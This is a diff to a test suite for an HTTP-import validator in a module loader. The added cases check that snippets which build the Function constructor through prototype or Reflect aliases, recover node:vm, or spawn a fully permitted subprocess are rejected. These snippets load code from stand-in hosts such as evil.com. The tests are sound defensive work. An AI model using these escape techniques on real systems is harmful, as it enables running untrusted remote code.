@@ -685,6 +685,30 @@ describe("routing/api/module-loader/http-validator", () => {
       await assertRejects(
         async () =>
           await validateHTTPImports(
+            `const mutate = Object.setPrototypeOf; const holder = {};` +
+              ` mutate(holder, () => {}); const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a direct call through a prototype-mutator alias must invalidate its target",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const { setPrototypeOf: mutate } = Object; const holder = {};` +
+              ` mutate(holder, () => {}); const make = holder.constructor;` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a destructured prototype-mutator alias must invalidate its target",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
             `const holder = {}; Reflect.set(holder, "__proto__", () => {});` +
               ` const make = holder.constructor;` +
               ` make('return import("https://evil.com/mod.js")')();`,
@@ -826,6 +850,50 @@ describe("routing/api/module-loader/http-validator", () => {
       await validateHTTPImports(
         `const c = Reflect.get(globalThis, "crypto"); export const GET = () => c;`,
         [],
+      );
+    });
+
+    it("should reject guarded Reflect.get calls through local aliases", async () => {
+      for (
+        const invocation of [
+          `get(() => {}, "constructor")`,
+          `get?.(() => {}, "constructor")`,
+          `get.call(Reflect, () => {}, "constructor")`,
+        ]
+      ) {
+        await assertRejects(
+          async () =>
+            await validateHTTPImports(
+              `const get = Reflect.get; const make = ${invocation};` +
+                ` make('return import("https://blocked.example/mod.js")')();`,
+              [],
+            ),
+          Error,
+          "dynamic code generation",
+          `${invocation} must retain Reflect.get capability checks`,
+        );
+      }
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const { get } = Reflect; const make = get(() => {}, "constructor");` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "destructuring Reflect.get must retain the guarded intrinsic",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `let get; ({ get } = Reflect); const make = get(() => {}, "constructor");` +
+              ` make('return import("https://blocked.example/mod.js")')();`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "an assigned Reflect.get alias must retain the guarded intrinsic",
       );
     });
 
@@ -1009,6 +1077,75 @@ describe("routing/api/module-loader/http-validator", () => {
           `${moduleName} starts an unchecked module graph`,
         );
       }
+    });
+
+    it("should reject module loads hidden from the bundled graph", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const name = "./helper.cjs"; export const value = require(name);`,
+            [],
+          ),
+        Error,
+        "unconstrained dynamic import",
+        "a nonliteral require target is invisible to the graph and injected require shim",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `import process from "node:process";` +
+              ` const make = process.getBuiltinModule("node:vm");` +
+              ` make.runInThisContext('import("https://blocked.example/mod.js")');`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "getBuiltinModule must not recover a restricted runtime module",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `import process from "node:process";` +
+              ` const { getBuiltinModule } = process; getBuiltinModule("node:module");`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a destructured getBuiltinModule remains a runtime module loader",
+      );
+    });
+
+    it("should reject subprocess loaders and exported capability aliases", async () => {
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const Command = Deno.Command;` +
+              ` new Command(Deno.execPath(), { args: ["run", "-A",` +
+              ` "https://blocked.example/mod.ts"] });`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a subprocess runtime can load modules outside the validated graph",
+      );
+      await assertRejects(
+        async () =>
+          await validateHTTPImports(
+            `const { Command } = Deno;` +
+              ` new Command(Deno.execPath(), { args: ["run", "-A",` +
+              ` "https://blocked.example/mod.ts"] });`,
+            [],
+          ),
+        Error,
+        "dynamic code generation",
+        "a destructured subprocess constructor remains an unchecked module loader",
+      );
+      await assertRejects(
+        async () => await validateHTTPImports(`export const RouteWorker = Worker;`, []),
+        Error,
+        "dynamic code generation",
+        "a capability alias must not become opaque after crossing a module edge",
+      );
     });
 
     it("should not treat erased TypeScript declarations as runtime bindings", async () => {
